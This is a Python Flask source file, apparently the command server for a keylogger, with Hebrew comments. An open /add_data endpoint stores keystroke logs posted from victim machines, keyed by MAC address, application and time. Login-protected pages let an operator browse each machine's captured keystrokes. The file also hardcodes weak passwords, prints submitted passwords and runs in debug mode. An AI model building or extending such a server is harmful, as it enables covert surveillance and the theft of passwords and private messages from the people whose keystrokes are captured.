import flask
from flask import Flask
import os
import json
import time
from flask_cors import CORS
import flask_login
app = Flask(__name__)
CORS(app)
data_file = r"C:\Users\1\Desktop\keylogger\server_data\computers"

from flask import Flask, render_template, request, redirect, url_for, jsonify
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user

app.secret_key = "סוד_מאובטח"  # מפתח להצפנה

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

# רשימת משתמשים וסיסמאות (כדאי לשמור בעתיד במסד נתונים)
users = {"admin": "password123", "user": "1234"}

# מחלקת משתמשים
class User(UserMixin):
    def __init__(self, username):
        self.id = username

# פונקציה שמטענת משתמש לפי ה-ID
@login_manager.user_loader
def load_user(user_id):
    return User(user_id) if user_id in users else None

# עמוד התחברות
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(password)
        if username in users and users[username] == password:
            user = User(username)
            login_user(user)
            return redirect(url_for('dashboard'))

    return render_template('index.html')

# עמוד מוגן (דשבורד)
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('style_navbar.html', username=current_user.id)


@app.route('/folders', methods=['GET'])
@login_required
def get_folders():
    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
    try:
        folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f))]
    except Exception as e:
        folders = []

    return render_template('list_of_folders.html', folders=folders)


from flask import render_template

@app.route('/folders/<folder_name>', methods=['GET'])
@login_required
def show_folder_contents(folder_name):
    # מחפש את הנתונים עבור תיקיית ה-MAC
    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
    files = load_data(mac_address=str(folder_name))

    # לא מחזיר JSON גולמי, אלא מעבד את הנתונים בצורה מתאימה
    file_info = []  # יצירת רשימה שתכיל את המידע עבור התצוגה
    print(files)
    print("aaaaaaaaaaaaaaaa")
    for mac, data in files.items():
        for date, files_in_date in data.items():

            for filename, key_events in files_in_date.items():
                for time_write , current_app_event in key_events.items():
                    for current_app , events in current_app_event.items():


                        file_info.append({
                            'mac': mac,
                            'date': date,
                            'filename': filename,
                            'app': current_app,
                            'time write' : time_write,
                            'events': events
                        })
                        # print(key_events)

    # מחזיר את המידע לתבנית ה-HTML
    return render_template('folder_contents.html', folder_name=folder_name, files=file_info)

# עמוד התנתקות
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


def load_data(mac_address=None, date=None, root_directory=data_file):
        all_data = {}
        # בדיקה שהתיקייה הראשית קיימת
        if not os.path.exists(root_directory):
            return all_data

        for mac in os.listdir(root_directory):
            mac_path = os.path.join(root_directory, mac)
            if not os.path.isdir(mac_path):
                continue

            if mac_address is not None and mac != mac_address:
                continue

            mac_data = {}  # מילון לאחסון הנתונים עבור MAC זה

            # מעבר על כל הקבצים בתיקיית ה-MAC (מחפשים קבצי JSON)
            for filename in os.listdir(mac_path):
                if not filename.endswith(".json"):
                    continue
                # הסרת הסיומת כדי לקבל את התאריך
                file_date = os.path.splitext(filename)[0]

                # אם סופק date והשם (התאריך) לא תואם, דלג
                if date is not None and not file_date.startswith(date):
                    continue

                file_path = os.path.join(mac_path, filename)
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    mac_data[file_date] = data
                except json.JSONDecodeError:
                    continue

            if mac_data:
                all_data[mac] = mac_data

        return all_data





x = {'d0:39:57:0d:5c:a5': {'20/02/2025  11:58': {'app.py – app.py': ['backspace', 'a']}}}

y = {'d0:39:57:0d:5c:a5': {'20/02/2025  11:58': {'app.py – app.py': ['1', '2', '3', '4', '5', '6', '7', '8', '9']}}}
def merge_dicts(dict_a, dict_b):
    """
    ממזג שני מילונים לפי הכללים:
    1. מפתחות משותפים ממוזגים בהתאם לסוג הערכים.
    2. מפתחות ייחודיים נשמרים כמות שהם.
    """
    print(dict_a)
    print("aaa")
    print(dict_b)
    print("bbb")

    merged = {}
    # נעבור על מפתחות dict_a
    for key, val_a in dict_a.items():
        if key in dict_b:
            # יש מפתח זהה גם ב-dict_b
            val_b = dict_b[key]
            merged[key] = merge_values(val_a, val_b)
        else:
            # המפתח קיים רק ב-dict_a
            merged[key] = val_a

    # נוסיף מפתחות שקיימים רק ב-dict_b
    for key, val_b in dict_b.items():
        if key not in dict_a:
            merged[key] = val_b
    print(merged)
    return merged

def merge_values(val_a, val_b):
    """
    ממזג שני ערכים בהתאם לסוגם:
    - אם שניהם dict => מיזוג רקורסיבי.
    - אם שניהם list => שרשור הרשימות.
    - אם אחד list והשני לא => הפיכה ל-list ושרשור.
    - אם שניהם לא list => הפיכתם לרשימה [val_a, val_b].
    """
    if isinstance(val_a, dict) and isinstance(val_b, dict):
        return merge_dicts(val_a, val_b)

    elif isinstance(val_a, list) and isinstance(val_b, list):
        return val_a + val_b

    elif isinstance(val_a, list) and not isinstance(val_b, list):
        return val_a + [val_b]

    elif not isinstance(val_a, list) and isinstance(val_b, list):
        return [val_a] + val_b

    else:
        return [val_a, val_b]

def save_new_data(data):
    first_key = (next(iter(data)))
    mac_address = first_key.replace(":" , "-")
    # גישה למפתח השני במילון הפנימי
    second_key = next(iter(data[first_key]))
    date = time.strftime('%d-%m-%Y_%H-%M')
    path = data_file + rf'\{mac_address}'
    # new_data = merge_dicts(old_data,data)
    # print(new_data)
    if not os.path.exists(path):
        os.makedirs(path)
    with open(path+rf"\{date}.json" , "w" , encoding='utf-8') as file:
        json.dump(data , file , indent=4 , ensure_ascii=False)



@app.route('/add_data', methods=['POST'])
def upload_data():
    new_data = flask.request.json
    if not new_data:
        return flask.jsonify({'error':"do not get data"}),400
    save_new_data(new_data)
    return flask.jsonify({'message':'save successfully'}),200


@app.route('/<computers>',methods=['GET'])
@login_required
def get_data(computers,mac_address=None,date=None):
        if not computers:
            return flask.jsonify({'error': 'must get -computers-'}), 400

        data = load_data(mac_address=mac_address, date=date)

        return flask.jsonify(data), 200




@app.route('/health',methods=['GET'])
def health():
    return flask.jsonify({'status':'server active'}),200

if __name__ == '__main__':
    app.run(debug=True)
print(load_data("d0-39-57-0d-5c-a5"))